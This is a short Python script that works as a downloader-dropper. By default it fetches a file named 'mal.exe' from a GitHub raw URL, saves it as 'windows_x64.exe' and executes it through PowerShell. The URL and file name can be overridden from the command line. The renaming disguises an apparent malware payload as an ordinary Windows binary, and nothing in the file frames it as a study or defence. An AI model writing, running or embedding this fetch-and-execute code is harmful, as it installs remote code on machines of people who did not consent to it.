from urllib.request import urlretrieve
from os import getcwd
from subprocess import run
from sys import argv

URL = "https://raw.githubusercontent.com/carlmelt/static/refs/heads/main/mal.exe"
OUTPUT = "windows_x64.exe"
DIR = getcwd() + "\\"

if __name__ == "__main__":
    if len(argv) >= 3:
        URL, OUTPUT = argv[1], argv[2]
    try:
        urlretrieve(URL, OUTPUT)
        print(f"File {OUTPUT} downloaded from {URL}.")
        res = run(["powershell.exe", DIR+OUTPUT])
        print(res)
    except Exception as e:
        print(f"Something went wrong: {e}")
        print("""
Usage: downloader <URL> <OUTPUT>
""")
